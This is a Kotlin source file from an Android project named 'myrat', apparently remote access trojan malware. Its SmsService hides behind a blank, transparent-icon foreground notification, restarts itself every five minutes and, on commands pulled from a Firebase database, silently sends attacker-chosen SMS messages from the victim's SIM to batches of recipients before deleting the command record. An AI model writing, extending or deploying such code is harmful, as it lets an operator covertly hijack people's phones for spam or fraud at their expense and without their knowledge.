package com.myrat.app.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.*
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger

class SmsService : Service() {
    companion object {
        private const val CHANNEL_ID = "SmsServiceChannel"
        private const val NOTIFICATION_ID = 1
    }

    // Track sent numbers per commandId to avoid duplicates
    private val sentSmsTracker = mutableMapOf<String, MutableSet<String>>()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val notification = buildForegroundNotification()
        startForeground(NOTIFICATION_ID, notification)
        scheduleRestart(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = MainActivity.getDeviceId(this)
        listenForSendCommands(deviceId)
        return START_STICKY
    }

    private fun scheduleRestart(context: Context) {
        val alarmIntent = Intent(context, SmsService::class.java)
        val pendingIntent = PendingIntent.getService(
            context, 0, alarmIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )


        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.setRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 60_000, // delay before restart
            5 * 60_000, // repeat every 5 minutes
            pendingIntent
        )
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "SMS Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Running SMS capture and send service"
            }
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.color.transparent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun listenForSendCommands(deviceId: String) {
        val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("send_sms_commands")

        commandsRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                snapshot.children.forEach { commandSnapshot ->
                    val command = commandSnapshot.value as? Map<*, *> ?: return
                    val status = command["status"] as? String
                    if (status == "pending") {
                        val simNumber = command["sim_number"] as? String
                        val recipients = command["recipients"] as? List<*>
                        val message = command["message"] as? String
                        if (simNumber != null && recipients != null && message != null) {
                            val validRecipients = recipients.filterIsInstance<String>().filter { it.isNotBlank() }
                            if (validRecipients.isNotEmpty()) {
                                sendSmsToAll(simNumber, validRecipients, message, commandSnapshot.key!!)
                            }
                        }
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Logger.error("Database error: ${error.message}", error.toException())
            }
        })
    }

    private fun sendSmsToAll(simNumber: String, recipients: List<String>, message: String, commandId: String) {
        val handler = Handler(Looper.getMainLooper())
        val deviceId = MainActivity.getDeviceId(this)
        val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")
        val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            getSystemService(SmsManager::class.java)
        } else {
            SmsManager.getDefault()
        }

        val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
        val subId = subscriptionManager.activeSubscriptionInfoList?.find {
            it.number == simNumber
        }?.subscriptionId

        val simSpecificSmsManager = subId?.let {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SmsManager.getSmsManagerForSubscriptionId(it)
            } else smsManager
        } ?: smsManager

        val chunks = recipients.chunked(10)

        fun sendChunk(index: Int) {
            if (index >= chunks.size) return

            val batch = chunks[index]
            val alreadySentSet = sentSmsTracker.getOrPut(commandId) { mutableSetOf() }

            batch.forEach { number ->
                if (alreadySentSet.contains(number)) {
                    Logger.log("Skipping duplicate SMS to $number for command $commandId")
                    return@forEach
                }

                try {
                    simSpecificSmsManager.sendTextMessage(number, null, message, null, null)
                    Logger.log("Sent SMS from $simNumber to $number")
                    alreadySentSet.add(number)

                    // Remove number from recipients list in Firebase
                    commandRef.child("recipients").runTransaction(object : Transaction.Handler {
                        override fun doTransaction(currentData: MutableData): Transaction.Result {
                            val currentList = currentData.getValue(object : GenericTypeIndicator<MutableList<String>>() {}) ?: mutableListOf()
                            currentList.remove(number)
                            currentData.value = currentList
                            return Transaction.success(currentData)
                        }

                        override fun onComplete(error: DatabaseError?, committed: Boolean, snapshot: DataSnapshot?) {
                            val newList = snapshot?.getValue(object : GenericTypeIndicator<List<String>>() {})
                            if (committed && (newList == null || newList.isEmpty())) {
                                commandRef.removeValue()
                                    .addOnSuccessListener { Logger.log("Removed command $commandId after final number sent") }
                                    .addOnFailureListener { e -> Logger.error("Failed to remove command: ${e.message}", e) }
                            }
                        }
                    })
                } catch (e: Exception) {
                    Logger.error("Failed to send SMS to $number: ${e.message}", e)
                }
            }

            // Schedule next batch
            if (index + 1 < chunks.size) {
                handler.postDelayed({ sendChunk(index + 1) }, 60_000L) // 1 min delay
            }
        }

        sendChunk(0)
    }
}
